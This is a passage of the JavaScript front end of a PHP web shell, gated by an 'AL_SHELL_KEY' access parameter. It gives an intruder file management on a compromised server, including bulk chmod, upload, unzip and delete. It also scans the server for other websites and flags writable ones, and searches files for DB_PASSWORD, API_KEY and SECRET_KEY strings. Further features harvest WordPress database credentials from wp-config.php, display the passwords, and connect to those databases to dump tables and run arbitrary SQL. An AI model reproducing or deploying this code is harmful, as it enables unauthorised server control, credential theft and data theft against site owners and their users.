        formData.append('action', 'delete_selected');
        checkboxes.forEach(cb => formData.append('selected_files[]', cb.value));
        fetch('', { method: 'POST', body: formData }).then(() => window.location.reload());
    }
});
chmodBulkBtn.addEventListener('click', function() {
    const checkboxes = document.querySelectorAll('.file-select:checked');
    if (checkboxes.length === 0) return;
    
    // Update count in modal
    document.getElementById('chmodBulkCount').textContent = checkboxes.length;
    
    // Reset modal state
    document.getElementById('chmodBulkProgress').style.display = 'none';
    document.getElementById('chmodBulkResults').style.display = 'none';
    document.getElementById('chmodBulkExecuteBtn').disabled = false;
    document.getElementById('chmodBulkExecuteBtn').textContent = '🚀 Execute';
    document.getElementById('chmodBulkCloseBtn').textContent = 'Cancel';
    
    openModal('chmodBulkModal');
});

// Chmod Bulk execute function
async function executeChmodBulk() {
    const checkboxes = document.querySelectorAll('.file-select:checked');
    const permission = document.getElementById('chmodBulkPerm').value === 'custom' 
        ? document.getElementById('chmodBulkCustomInput').value 
        : document.getElementById('chmodBulkPerm').value;
    const recursive = document.getElementById('chmodBulkRecursive').checked;
    
    if (!permission) {
        alert('Please enter a permission value');
        return;
    }
    
    // UI updates
    const executeBtn = document.getElementById('chmodBulkExecuteBtn');
    const closeBtn = document.getElementById('chmodBulkCloseBtn');
    const progressDiv = document.getElementById('chmodBulkProgress');
    const resultsDiv = document.getElementById('chmodBulkResults');
    const progressBar = document.getElementById('chmodBulkProgressBar');
    const currentSpan = document.getElementById('chmodBulkCurrent');
    const totalSpan = document.getElementById('chmodBulkTotal');
    const statusDiv = document.getElementById('chmodBulkStatus');
    
    executeBtn.disabled = true;
    executeBtn.textContent = '⏳ Processing...';
    closeBtn.textContent = 'Running...';
    progressDiv.style.display = 'block';
    resultsDiv.style.display = 'block';
    resultsDiv.innerHTML = '<div style="color:#6cf">🚀 Starting chmod bulk operation...</div>';
    
    const files = Array.from(checkboxes).map(cb => cb.value);
    
    try {
        const formData = new FormData();
        formData.append('action', 'chmod_bulk');
        formData.append('chmod_perm', permission);
        formData.append('chmod_recursive', recursive ? '1' : '0');
        files.forEach(f => formData.append('selected_files[]', f));
        
        statusDiv.textContent = 'Sending request...';
        
        const response = await fetch('', { method: 'POST', body: formData });
        const data = await response.json();
        
        if (data.success) {
            totalSpan.textContent = data.total;
            currentSpan.textContent = data.total;
            progressBar.style.width = '100%';
            
            // Sort: success first, then failed
            const sortedItems = data.processed.sort((a, b) => {
                if (a.success === b.success) return 0;
                return a.success ? -1 : 1; // Success first
            });
            
            // Build results
            let html = '';
            html += '<div style="margin-bottom:10px;padding:8px;background:#1a1a1a;border-radius:4px;display:flex;gap:15px;">';
            html += '<span style="color:#0f0">✅ Success: ' + data.success_count + '</span>';
            html += '<span style="color:#f44">❌ Failed: ' + data.failed_count + '</span>';
            html += '<span style="color:#888">Total: ' + data.total + '</span>';
            html += '</div>';
            
            // Show processed items with clickable paths (limited to first 100)
            const displayItems = sortedItems.slice(0, 100);
            displayItems.forEach(item => {
                const icon = item.type === 'dir' ? '📁' : '📄';
                const color = item.success ? '#0f0' : '#f44';
                const status = item.success ? '✓' : '✗';
                const encodedDir = encodeURIComponent(item.dir);
                
                html += '<div style="margin:3px 0;font-size:11px;display:flex;align-items:center;gap:8px;">';
                html += '<span style="color:' + color + ';font-weight:bold;min-width:15px;">' + status + '</span>';
                html += '<span style="color:#888">' + icon + '</span>';
                html += '<a href="?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodedDir + '" ';
                html += 'target="_blank" style="color:#6cf;text-decoration:none;word-break:break-all;" ';
                html += 'title="Open: ' + escapeHtml(item.dir) + '">';
                html += escapeHtml(item.path);
                html += '</a>';
                html += '</div>';
            });
            
            if (sortedItems.length > 100) {
                html += '<div style="color:#888;font-size:10px;margin-top:10px;padding:5px;background:#111;border-radius:4px;">';
                html += '... and ' + (sortedItems.length - 100) + ' more items (showing first 100)</div>';
            }
            
            // Show errors if any (only failed items summary)
            if (data.failed_count > 0) {
                html += '<div style="margin-top:15px;padding:8px;background:#2a0000;border-radius:4px;border:1px solid #f44;">';
                html += '<div style="color:#f44;font-weight:bold;margin-bottom:8px;">❌ Failed Items Summary:</div>';
                const failedItems = sortedItems.filter(item => !item.success).slice(0, 20);
                failedItems.forEach(item => {
                    html += '<div style="color:#f88;font-size:10px;margin:2px 0;word-break:break-all;">• ' + escapeHtml(item.path) + '</div>';
                });
                if (data.failed_count > 20) {
                    html += '<div style="color:#888;font-size:10px;margin-top:5px;">... and ' + (data.failed_count - 20) + ' more failed</div>';
                }
                html += '</div>';
            }
            
            resultsDiv.innerHTML = html;
            statusDiv.innerHTML = '<span style="color:#0f0;font-weight:bold;">✅ Completed!</span>';
            
            executeBtn.textContent = '✅ Done';
            closeBtn.textContent = 'Close';
            
            // Don't auto refresh - let user review results and click paths
        } else {
            throw new Error('Server returned error');
        }
    } catch (error) {
        resultsDiv.innerHTML = '<div style="color:#f44">❌ Error: ' + escapeHtml(error.message) + '</div>';
        statusDiv.innerHTML = '<span style="color:#f44">❌ Failed</span>';
        executeBtn.disabled = false;
        executeBtn.textContent = '🚀 Retry';
        closeBtn.textContent = 'Close';
    }
}

// Chmod bulk permission select change
document.getElementById('chmodBulkPerm').addEventListener('change', function() {
    const customDiv = document.getElementById('chmodBulkCustomDiv');
    if (this.value === 'custom') {
        customDiv.style.display = 'block';
    } else {
        customDiv.style.display = 'none';
    }
});
function unzipFile(fileName) {
    if (confirm(`Unzip "${fileName}"?`)) {
        const formData = new FormData();
        formData.append('action', 'unzip_file');
        formData.append('unzip_target', fileName);
        fetch('', { method: 'POST', body: formData }).then(() => window.location.reload());
    }
}
function sortTable(columnIndex) {
    const table = document.querySelector(".file-table");
    const tbody = table.querySelector("tbody");
    const rows = Array.from(tbody.querySelectorAll("tr"));
    const headers = table.querySelectorAll("thead th");
    
    // Get current sort state
    const currentSortCol = parseInt(table.dataset.sortCol) || 2;
    let isAscending = table.dataset.sortOrder === 'asc';
    
    // Toggle direction if clicking same column, otherwise default to ascending
    if (currentSortCol === columnIndex) {
        isAscending = !isAscending;
    } else {
        isAscending = true;
    }
    
    table.dataset.sortCol = columnIndex;
    table.dataset.sortOrder = isAscending ? 'asc' : 'desc';
    
    // Update header indicators
    headers.forEach((th, idx) => {
        th.classList.remove('sort-asc', 'sort-desc');
        const indicator = th.querySelector('.sort-indicator');
        if (indicator) indicator.textContent = '';
        
        if (idx === columnIndex) {
            th.classList.add(isAscending ? 'sort-asc' : 'sort-desc');
            if (indicator) indicator.textContent = isAscending ? '↑' : '↓';
        }
    });
    
    rows.sort((a, b) => {
        if (!a.hasAttribute('data-filename')) return -1;
        if (!b.hasAttribute('data-filename')) return 1;
        let aVal = a.children[columnIndex].textContent.trim();
        let bVal = b.children[columnIndex].textContent.trim();
        // Size column (index 4)
        if (columnIndex === 4) {
            if (aVal === '-') aVal = -1;
            else aVal = parseFloat(aVal.replace(' MB', ''));
            if (bVal === '-') bVal = -1;
            else bVal = parseFloat(bVal.replace(' MB', ''));
        } else if (columnIndex === 5) {
            // Modified column (index 5)
            const parseDate = (str) => {
                const parts = str.split(' ');
                const dParts = parts[0].split('-');
                return new Date(`${dParts[2]}-${dParts[1]}-${dParts[0]} ${parts[1]}`).getTime();
            };
            aVal = parseDate(aVal);
            bVal = parseDate(bVal);
        }
        if (aVal < bVal) return isAscending ? -1 : 1;
        if (aVal > bVal) return isAscending ? 1 : -1;
        return 0;
    });
    tbody.innerHTML = "";
    rows.forEach(row => tbody.appendChild(row));
}
(function initDragDropUpload() {
    const dropZone = document.getElementById('dropZone');
    const fileInput = document.getElementById('uploadFileInput');
    const fileList = document.getElementById('dropFileList');
    const submitBtn = document.getElementById('uploadSubmitBtn');
    const uploadForm = document.getElementById('uploadForm');
    const fileCountSpan = document.getElementById('fileCount');
    if (!dropZone || !fileInput) return;
    let selectedFiles = [];
    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
        dropZone.addEventListener(eventName, preventDefaults, false);
        document.body.addEventListener(eventName, preventDefaults, false);
    });
    ['dragenter', 'dragover'].forEach(eventName => {
        dropZone.addEventListener(eventName, highlight, false);
    });
    ['dragleave', 'drop'].forEach(eventName => {
        dropZone.addEventListener(eventName, unhighlight, false);
    });
    dropZone.addEventListener('drop', handleDrop, false);
    fileInput.addEventListener('change', function() {
        if (this.files.length > 0) {
            handleFiles(Array.from(this.files));
        }
    });
    dropZone.addEventListener('click', function(e) {
        if (e.target.classList.contains('drop-file-remove')) {
            e.stopPropagation();
            const index = parseInt(e.target.dataset.index);
            removeFile(index);
        }
    });
    function preventDefaults(e) {
        e.preventDefault();
        e.stopPropagation();
    }
    function highlight(e) {
        dropZone.classList.add('drag-over');
    }
    function unhighlight(e) {
        dropZone.classList.remove('drag-over');
    }
    function handleDrop(e) {
        const dt = e.dataTransfer;
        const files = dt.files;
        if (files.length > 0) {
            handleFiles(Array.from(files));
        }
    }
    function handleFiles(files) {
        selectedFiles = selectedFiles.concat(files);
        updateFileList();
    }
    function updateFileList() {
        if (selectedFiles.length === 0) {
            fileList.innerHTML = '';
            submitBtn.disabled = true;
            submitBtn.innerHTML = '📤 Upload <span id="fileCount">0</span> File(s)';
            return;
        }
        let html = '';
        selectedFiles.forEach((file, index) => {
            const fileSize = formatFileSize(file.size);
            html += `
                <div class="drop-file-item">
                    <span class="drop-file-name">${escapeHtml(file.name)}</span>
                    <span class="drop-file-size">${fileSize}</span>
                    <span class="drop-file-remove" data-index="${index}" title="Hapus">❌</span>
                </div>
            `;
        });
        fileList.innerHTML = html;
        submitBtn.disabled = false;
        submitBtn.innerHTML = `📤 Upload ${selectedFiles.length} File(s)`;
    }
    function removeFile(index) {
        selectedFiles.splice(index, 1);
        updateFileList();
    }
    function formatFileSize(bytes) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }
    
    // Handle form submission with FormData
    uploadForm.addEventListener('submit', function(e) {
        e.preventDefault();
        if (selectedFiles.length === 0) return;
        
        const formData = new FormData(uploadForm);
        // Clear existing files and add selected files
        // Note: FormData from the form already has files from fileInput
        // We need to replace them with our selectedFiles
        
        // Since we can't easily replace files in FormData, 
        // we'll create a new FormData and manually add fields
        const newFormData = new FormData();
        newFormData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
        newFormData.append('d', '<?php echo htmlspecialchars($dir) ?>');
        
        selectedFiles.forEach((file, index) => {
            newFormData.append('upload_file[]', file);
        });
        
        // Show loading state
        submitBtn.disabled = true;
        submitBtn.innerHTML = '⏳ Uploading...';
        
        fetch('', {
            method: 'POST',
            body: newFormData
        })
        .then(response => response.text())
        .then(html => {
            // Parse response to check for success/error
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            const output = doc.querySelector('.output');
            
            if (output) {
                alert(output.textContent.trim());
            } else {
                alert('Upload completed!');
            }
            
            // Reset form
            selectedFiles = [];
            updateFileList();
            fileInput.value = '';
            
            // Refresh page to show new files
            window.location.reload();
        })
        .catch(error => {
            alert('Upload failed: ' + error.message);
            submitBtn.disabled = false;
            submitBtn.innerHTML = '📤 Upload ' + selectedFiles.length + ' File(s)';
        });
    });
})();
let currentSearchType = 'filename';
let currentScanMode = 'standard';
let isScanning = false;
function discoverWebsites() {
    openModal('websiteDiscoverModal');
    resetDiscoverModal();
}
function resetDiscoverModal() {
    document.getElementById('websiteDiscoverContent').innerHTML = `
        <div class="discover-placeholder">
            <span style="font-size:50px;">🌐</span>
            <h3 style="color:#6cf;margin:15px 0;">🌐 Website Discovery</h3>
            <p style="color:#888;">Konfigurasi pencarian di panel kiri, lalu klik "Mulai Scan"</p>
            <div style="margin-top:20px;text-align:left;padding:15px;background:#1a1a1a;border-radius:6px;font-size:11px;">
                <p style="color:#6cf;margin-bottom:10px;"><strong>💡 Tips Penggunaan:</strong></p>
                <p style="color:#888;margin:5px 0;"><strong>📄 Mode Nama File:</strong></p>
                <p style="color:#666;margin:3px 0;padding-left:10px;">• index.php, index.html, .htaccess</p>
                <p style="color:#666;margin:3px 0;padding-left:10px;">• wp-config.php, configuration.php</p>
                <p style="color:#666;margin:3px 0;padding-left:10px;">• *.php, config.* (wildcard)</p>
                <p style="color:#888;margin:10px 0 5px 0;"><strong>📝 Mode Konten:</strong></p>
                <p style="color:#666;margin:3px 0;padding-left:10px;">• DB_PASSWORD, username, password</p>
                <p style="color:#666;margin:3px 0;padding-left:10px;">• API_KEY, SECRET_KEY, token</p>
            </div>
        </div>
    `;
}
let currentDbConfig = {};
function selectSearchType(type) {
    currentSearchType = type;
    document.querySelectorAll('.search-type').forEach(el => el.classList.remove('active'));
    document.querySelector('.search-type[data-type="' + type + '"]').classList.add('active');
    const patternInput = document.getElementById('searchPattern');
    const hintText = document.getElementById('patternHint');
    if (type === 'filename') {
        patternInput.placeholder = 'index.php, index.html, .htaccess';
        hintText.textContent = 'Contoh: *.php, config.*, wp-config.php';
        patternInput.value = 'index.php, index.html, .htaccess';
    } else {
        patternInput.placeholder = 'DB_PASSWORD, username, api_key';
        hintText.textContent = 'Cari file yang mengandung string ini';
        patternInput.value = 'DB_PASSWORD, password, username';
    }
}
function selectScanMode(mode) {
    currentScanMode = mode;
    document.querySelectorAll('.scan-mode').forEach(el => el.classList.remove('active'));
    document.querySelector('.scan-mode[data-mode="' + mode + '"]').classList.add('active');
}
function startWebsiteScan() {
    if (isScanning) return;
    const patternInput = document.getElementById('searchPattern').value.trim();
    if (!patternInput) {
        alert('Masukkan pattern pencarian!');
        return;
    }
    isScanning = true;
    const content = document.getElementById('websiteDiscoverContent');
    const startTime = Date.now();
    const statsDiv = document.getElementById('scanStats');
    const timeSpan = document.getElementById('scanTime');
    const countSpan = document.getElementById('scanCount');
    const statusSpan = document.getElementById('scanStatus');
    const extractTitle = document.getElementById('extractTitle').checked;
    const showPreview = document.getElementById('showPreview').checked;
    document.getElementById('startScanBtn').disabled = true;
    document.getElementById('startScanBtn').textContent = '- Scanning...';
    statsDiv.style.display = 'block';
    statusSpan.textContent = currentSearchType === 'filename' ? 'Mencari file...' : 'Mencari konten...';
    const timerInterval = setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        timeSpan.textContent = elapsed + 's';
    }, 1000);
    const modeLabels = {
        'quick': '⚡ Quick',
        'standard': '📊 Standard',
        'deep': '🎯 Deep',
        'brutal': '💀 Brutal'
    };
    const scanModeDepth = {
        'quick': '1-2',
        'standard': '3-4',
        'deep': '5-6',
        'brutal': '8+'
    };
    const params = new URLSearchParams();
    params.append('masuk', '<?php echo AL_SHELL_KEY ?>');
    params.append('action', 'discover_websites');
    params.append('mode', currentScanMode);
    params.append('search_type', currentSearchType);
    params.append('pattern', patternInput);
    params.append('extract_title', extractTitle ? '1' : '0');
    params.append('show_preview', showPreview ? '1' : '0');
    fetch('?' + params.toString())
        .then(response => {
            if (!response.ok) {
                throw new Error('HTTP ' + response.status + ': ' + response.statusText);
            }
            return response.text();
        })
        .then(text => {
            let data;
            try {
                data = JSON.parse(text);
            } catch (e) {
                console.error('Invalid JSON response:', text);
                throw new Error('Invalid server response');
            }
            if (!Array.isArray(data)) {
                throw new Error('Unexpected response format');
            }
            return data;
        })
        .then(data => {
            clearInterval(timerInterval);
            if (data.length === 0) {
                content.innerHTML = '<p style="color: #f44; text-align: center; padding: 50px;">❌ Tidak ditemukan website di server ini.</p>';
                document.getElementById('startScanBtn').textContent = '🔄 Mulai Scan Ulang';
                document.getElementById('startScanBtn').disabled = false;
                isScanning = false;
                statusSpan.textContent = 'Tidak ditemukan';
                return;
            }
            countSpan.textContent = data.length;
            statusSpan.textContent = 'Selesai!';
            document.getElementById('startScanBtn').textContent = '✅ Scan Selesai';
            isScanning = false;
            if (currentSearchType === 'filename') {
                renderFilenameResults(data, content);
            } else {
                renderContentResults(data, content);
            }
        })
        .catch(error => {
            console.error('Discover Websites Error:', error);
            content.innerHTML = '<div style="color: #f44; padding: 20px; text-align: center;">' +
                '<p>❌ Error: ' + escapeHtml(error.message) + '</p>' +
                '<p style="font-size: 11px; color: #666; margin-top: 10px;">Coba refresh dan jalankan lagi</p>' +
                '</div>';
        });
}
function navigateToDir(path) {
    window.location.href = '?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodeURIComponent(path);
}
function renderFilenameResults(data, content) {
    data.sort((a, b) => {
        if (a.has_title && !b.has_title) return -1;
        if (!a.has_title && b.has_title) return 1;
        return a.path.localeCompare(b.path);
    });
    let html = `<div style="background: #0f0; color: #000; padding: 12px; border-radius: 4px; margin-bottom: 15px; text-align: center; font-size: 14px;">`;
    html += `<strong>- Ditemukan ${data.length} website!</strong>`;
    html += `<span style="display: block; font-size: 11px; margin-top: 5px; color: #333;">`;
    html += `Dengan title: ${data.filter(s => s.title).length} | `;
    html += `Writable: ${data.filter(s => s.writable).length}`;
    html += `</span>`;
    html += `</div>`;
    data.forEach((site, index) => {
        const hasTitle = site.title ? true : false;
        const priorityClass = hasTitle ? 'priority' : '';
        const titleBadge = hasTitle
            ? '<span class="website-badge badge-title">- TITLE FOUND</span>'
            : '';
        const writableBadge = site.writable
            ? '<span class="website-badge badge-writable">WRITABLE</span>'
            : '<span class="website-badge badge-readonly">READ-ONLY</span>';
        const typeColor = site.type === 'WordPress' ? '#ff0' :
                         site.type === 'Laravel' ? '#f0f' :
                         site.type === 'Static HTML' ? '#6cf' : '#0f0';
        const encodedPath = encodeURIComponent(site.path);
        const shellUrl = window.location.pathname + '?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodedPath;
        html += `
            <div class="website-item ${priorityClass}">
                <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 10px;">
                    <div style="flex: 1;">
                        <div style="display: flex; align-items: center; flex-wrap: wrap; gap: 5px;">
                            <span style="color: #6cf; font-weight: bold;">#${index + 1}</span>
                            <span style="color: ${typeColor}; font-weight: bold;">${site.type}</span>
                            ${writableBadge}
                            ${titleBadge}
                        </div>
                        ${hasTitle ? `<div class="website-title">' ${escapeHtml(site.title)}</div>` : ''}
                    </div>
                    <a href="${shellUrl}" target="_blank" style="padding: 6px 15px; font-size: 12px; background: #0f0; color: #000; text-decoration: none; border-radius: 4px; font-weight: bold; white-space: nowrap; margin-left: 10px;">- Buka</a>
                </div>
                <div class="website-path">${escapeHtml(site.path)}</div>
                <div class="website-meta">
                    <span>📄 Marker: ${site.marker}</span>
                    <span> ${site.size}</span>
                    <span>${site.writable ? ' Writable' : ' Read-only'}</span>
                </div>
            </div>
        `;
    });
    content.innerHTML = html;
}
function renderContentResults(data, content) {
    let html = `<div style="background: #ff0; color: #000; padding: 12px; border-radius: 4px; margin-bottom: 15px; text-align: center; font-size: 14px;">`;
    html += `<strong>- Ditemukan ${data.length} file dengan konten cocok!</strong>`;
    html += `<span style="display: block; font-size: 11px; margin-top: 5px; color: #333;">`;
    html += `Writable: ${data.filter(s => s.writable).length} | Total matches: ${data.reduce((acc, s) => acc + s.matches.length, 0)}`;
    html += `</span>`;
    html += `</div>`;
    data.forEach((file, index) => {
        const writableBadge = file.writable
            ? '<span class="website-badge badge-writable">WRITABLE</span>'
            : '<span class="website-badge badge-readonly">READ-ONLY</span>';
        const encodedPath = encodeURIComponent(file.path);
        const shellUrl = window.location.pathname + '?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodeURIComponent(dirname(file.path));
        html += `
            <div class="website-item">
                <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 10px;">
                    <div style="flex: 1;">
                        <div style="display: flex; align-items: center; flex-wrap: wrap; gap: 5px;">
                            <span style="color: #6cf; font-weight: bold;">#${index + 1}</span>
                            <span style="color: #ff0; font-weight: bold;">${file.type}</span>
                            ${writableBadge}
                        </div>
                    </div>
                    <div style="display: flex; gap: 5px;">
                        <a href="${shellUrl}" target="_blank" style="padding: 4px 10px; font-size: 11px; background: #0f0; color: #000; text-decoration: none; border-radius: 4px; font-weight: bold;">- Dir</a>
                    </div>
                </div>
                <div class="website-path">${escapeHtml(file.path)}</div>
                <div style="margin-top: 10px;">
                    <p style="color: #6cf; font-size: 11px; margin-bottom: 5px;">🔍 Pattern cocok:</p>
                    ${file.matches.map(m => `
                        <div style="background: #222; padding: 8px; border-radius: 3px; margin: 5px 0; font-size: 11px; border-left: 3px solid #0f0;">
                            <span style="color: #ff0; font-weight: bold;">${escapeHtml(m.pattern)}</span>
                            ${file.preview && m.context ? `
                                <div style="color: #888; margin-top: 5px; font-family: monospace; white-space: pre-wrap; word-break: break-all;">${escapeHtml(m.context)}</div>
                            ` : ''}
                        </div>
                    `).join('')}
                </div>
                <div class="website-meta">
                    <span> ${file.size}</span>
                    <span>${file.writable ? ' Writable' : ' Read-only'}</span>
                </div>
            </div>
        `;
    });
    content.innerHTML = html;
}
function dirname(path) {
    return path.substring(0, path.lastIndexOf('/'));
}
function exploreDatabase() {
    openModal('dbExploreModal');
    const content = document.getElementById('dbExploreContent');
    content.innerHTML = '<p>⏳ Searching for wp-config.php files... This may take a moment.</p>';
    fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=explore_db')
        .then(response => {
            if (!response.ok) {
                throw new Error('HTTP ' + response.status + ': ' + response.statusText);
            }
            return response.text();
        })
        .then(text => {
            let data;
            try {
                data = JSON.parse(text);
            } catch (e) {
                console.error('Invalid JSON response:', text);
                throw new Error('Invalid server response. Check PHP error logs.');
            }
            if (!Array.isArray(data)) {
                throw new Error('Unexpected response format');
            }
            return data;
        })
        .then(data => {
            if (data.length === 0) {
                content.innerHTML = '<p style="color: #f44;">❌ No WordPress configurations found.</p>';
                return;
            }
            let html = `<p style="color: #0f0;">🔍 Found ${data.length} configuration(s):</p>`;
            html += '<div style="max-height: 400px; overflow-y: auto;">';
            data.forEach((config, index) => {
                html += `
                    <div style="border: 1px solid #0f0; margin: 10px 0; padding: 10px; background: #1a1a1a; border-radius: 4px;">
                        <h4 style="margin: 0 0 10px 0; color: #6cf;">- Config #${index + 1}</h4>
                        <p style="font-size: 11px; margin: 3px 0; color: #888;"><strong>File:</strong> ${escapeHtml(config.filepath)}</p>
                        <p style="font-size: 11px; margin: 3px 0;"><strong>🖥️ Host:</strong> <span style="color: #f0f;">${escapeHtml(config.db_host)}</span></p>
                        <p style="font-size: 11px; margin: 3px 0;"><strong>🔌 Port:</strong> <span style="color: #f0f;">${config.db_port}</span></p>
                        <p style="font-size: 11px; margin: 3px 0;"><strong>🗄️ Database</strong> <span style="color: #ff0;">${escapeHtml(config.db_name)}</span></p>
                        <p style="font-size: 11px; margin: 3px 0;"><strong>👤 Username:</strong> <span style="color: #0f0;">${escapeHtml(config.db_user)}</span></p>
                        <p style="font-size: 11px; margin: 3px 0;"><strong>🔒 Password:</strong> <span style="color: #f44; background: #300; padding: 2px 5px; border-radius: 3px;">${escapeHtml(config.db_pass)}</span></p>
                        <p style="font-size: 11px; margin: 3px 0;"><strong>📋 Table Prefix:</strong> ${escapeHtml(config.table_prefix)}</p>
                        <div style="margin-top: 10px;">
                            <button onclick="connectFromExplore('${config.db_host}', ${config.db_port}, '${config.db_name}', '${config.db_user}', '${config.db_pass}')">
                                " Connect to this DB
                            </button>
                        </div>
                    </div>
                `;
            });
            html += '</div>';
            content.innerHTML = html;
        })
        .catch(error => {
            console.error('Explore DB Error:', error);
            content.innerHTML = '<div style="color: #f44; padding: 10px; background: #300; border-radius: 4px;">' +
                '<p><strong>❌ Error:</strong> ' + escapeHtml(error.message) + '</p>' +
                '<p style="font-size: 11px; margin-top: 10px;">Possible causes:</p>' +
                '<ul style="font-size: 11px; margin: 5px 0; padding-left: 20px;">' +
                '<li>PHP execution timeout</li>' +
                '<li>Memory limit exceeded</li>' +
                '<li>Permission denied on directories</li>' +
                '<li>Check browser console for details</li>' +
                '</ul></div>';
        });
}
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
function connectFromExplore(host, port, name, user, pass) {
    closeModal('dbExploreModal');
    document.getElementById('dbHost').value = host;
    document.getElementById('dbPort').value = port;
    document.getElementById('dbName').value = name;
    document.getElementById('dbUser').value = user;
    document.getElementById('dbPass').value = pass;
    openModal('dbConnectModal');
}
function testDbConnection() {
    const statusDiv = document.getElementById('dbConnectStatus');
    statusDiv.style.display = 'block';
    statusDiv.innerHTML = '<p style="color: #888;">⏳ Testing connection...</p>';
    const formData = new FormData(document.getElementById('dbConnectForm'));
    formData.append('action', 'connect_db');
    fetch('', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                statusDiv.innerHTML = '<p style="color: #0f0;">✅ Connection successful!</p>';
            } else {
                statusDiv.innerHTML = '<p style="color: #f44;">❌ Connection failed: ' + escapeHtml(data.error) + '</p>';
            }
        })
        .catch(error => {
            statusDiv.innerHTML = '<p style="color: #f44;">❌ Error: ' + error.message + '</p>';
        });
}
function connectToDatabase() {
    const host = document.getElementById('dbHost').value;
    const port = document.getElementById('dbPort').value;
    const name = document.getElementById('dbName').value;
    const user = document.getElementById('dbUser').value;
    const pass = document.getElementById('dbPass').value;
    if (!host || !name || !user) {
        alert('Please fill in Host, Database Name, and Username');
        return;
    }
    currentDbConfig = {
        host: host,
        port: port || 3306,
        name: name,
        user: user,
        pass: pass
    };
    closeModal('dbConnectModal');
    openModal('dbManagerModal');
    const tablesDiv = document.getElementById('dbTablesList');
    tablesDiv.innerHTML = '<p style="color: #888; padding: 10px;">⏳ Loading tables...</p>';
    const formData = new FormData();
    formData.append('action', 'get_tables');
    formData.append('db_host', currentDbConfig.host);
    formData.append('db_port', currentDbConfig.port);
    formData.append('db_name', currentDbConfig.name);
    formData.append('db_user', currentDbConfig.user);
    formData.append('db_pass', currentDbConfig.pass);
    fetch('', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                let html = `<div style="background: #222; padding: 10px; border-radius: 4px; margin-bottom: 10px;">`;
                html += `<div style="color: #0f0; font-size: 11px;">🖥️ MySQL ${escapeHtml(data.server_info)}</div>`;
                html += `<div style="color: #6cf; font-size: 11px; margin-top: 5px;">📊 ${data.tables.length} table(s)</div>`;
                html += `</div>`;
                html += '<ul>';
                data.tables.forEach(table => {
                    html += `<li onclick="viewTableData('${table}')"> ${escapeHtml(table)}</li>`;
                });
                html += '</ul>';
                tablesDiv.innerHTML = html;
            } else {
                tablesDiv.innerHTML = '<p style="color: #f44; padding: 10px;">❌ Error: ' + escapeHtml(data.error) + '</p>';
            }
        })
        .catch(error => {
            tablesDiv.innerHTML = '<p style="color: #f44; padding: 10px;">❌ Error: ' + error.message + '</p>';
        });
}
function viewTableData(tableName) {
    const resultDiv = document.getElementById('sqlResult');
    resultDiv.innerHTML = '<p style="color: #888;">⏳ Loading table data...</p>';
    const formData = new FormData();
    formData.append('action', 'get_table_data');
    formData.append('db_host', currentDbConfig.host);
    formData.append('db_port', currentDbConfig.port);
    formData.append('db_name', currentDbConfig.name);
    formData.append('db_user', currentDbConfig.user);
    formData.append('db_pass', currentDbConfig.pass);
    formData.append('table', tableName);
    fetch('', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                let html = `<div style="background: #222; padding: 10px 15px; border-radius: 4px; margin-bottom: 15px;">`;
                html += `<span style="color: #0f0; font-size: 14px;"> <strong>${escapeHtml(tableName)}</strong></span>`;
                html += `<span style="color: #888; margin-left: 20px;">Total: ${data.total_rows} rows</span>`;
                html += `<span style="color: #6cf; margin-left: 20px;">Showing: ${data.data.length}</span>`;
                html += `</div>`;
                if (data.columns.length > 0) {
                    html += '<div style="overflow-x: auto; border: 1px solid #0f0; border-radius: 4px;">';
                    html += '<table style="width: 100%; border-collapse: collapse; font-size: 12px;">';
                    html += '<thead><tr>';
                    data.columns.forEach(col => {
                        html += `<th>${escapeHtml(col)}</th>`;
                    });
                    html += '</tr></thead><tbody>';
                    data.data.forEach((row) => {
                        html += `<tr>`;
                        data.columns.forEach(col => {
                            const val = row[col] !== null ? row[col] : '<span style="color: #666;">NULL</span>';
                            html += `<td title="${escapeHtml(String(val)).replace(/"/g, '&quot;')}">${escapeHtml(String(val))}</td>`;
                        });
                        html += '</tr>';
                    });
                    html += '</tbody></table></div>';
                } else {
                    html += '<p style="color: #888; padding: 20px; text-align: center;">Table is empty</p>';
                }
                document.getElementById('sqlQuery').value = `SELECT * FROM \`${tableName}\` LIMIT 50;`;
                resultDiv.innerHTML = html;
            } else {
                resultDiv.innerHTML = '<p style="color: #f44;">❌ Error: ' + escapeHtml(data.error) + '</p>';
            }
        })
        .catch(error => {
            resultDiv.innerHTML = '<p style="color: #f44;">❌ Error: ' + error.message + '</p>';
        });
}
function executeSqlQuery() {
    const query = document.getElementById('sqlQuery').value.trim();
    if (!query) {
        alert('Please enter a SQL query');
        return;
    }
    const resultDiv = document.getElementById('sqlResult');
    resultDiv.innerHTML = '<p style="color: #888;">▶️ Executing query...</p>';
    const formData = new FormData();
    formData.append('action', 'execute_sql');
    formData.append('db_host', currentDbConfig.host);
    formData.append('db_port', currentDbConfig.port);
    formData.append('db_name', currentDbConfig.name);
    formData.append('db_user', currentDbConfig.user);
    formData.append('db_pass', currentDbConfig.pass);
    formData.append('sql_query', query);
    fetch('', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            let html = '';
            html += `<div style="background: #222; padding: 10px 15px; border-radius: 4px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;">`;
            html += `<span style="color: #6cf;">⏱️ ${data.execution_time}</span>`;
            if (data.success) {
                if (data.message) {
                    html += `<span style="color: #0f0;">✅ ${escapeHtml(data.message)}</span>`;
